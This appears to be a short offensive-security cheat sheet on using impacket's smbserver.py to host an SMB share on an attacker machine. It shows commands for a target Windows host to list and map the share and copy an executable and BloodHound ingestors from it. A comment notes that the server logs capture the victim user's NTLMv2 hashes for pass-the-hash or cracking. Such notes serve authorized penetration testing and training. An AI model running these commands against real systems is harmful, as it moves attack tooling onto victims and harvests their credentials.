!!! info ""

    ```bash
    # Set up a SMB server using smbserver.py from impacket
    smbserver.py SHARE_NAME path/to/share

    # From target Windows:
    net view \\KALI_IP
    (Should display the SHARE_NAME)

    dir \\KALI_IP\SHARE_NAME
    copy \\KALI_IP\SHARE_NAME\file.exe .

    # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user
    # can be usefull to PTH, or crack passwords

    # Since Windows 10, you can't do anonymous smb server anymore
    sudo python smbserver.py SDFR /BloodHound/Ingestors -smb2support -username "peon" -password "peon"
    net use Z: \\192.168.30.130\SDFR /user:peon peon
    net use Z: /delete /y
    ```

    ```bash
    impacket smbserver
    net use z: \\attackerip\sharename
    ```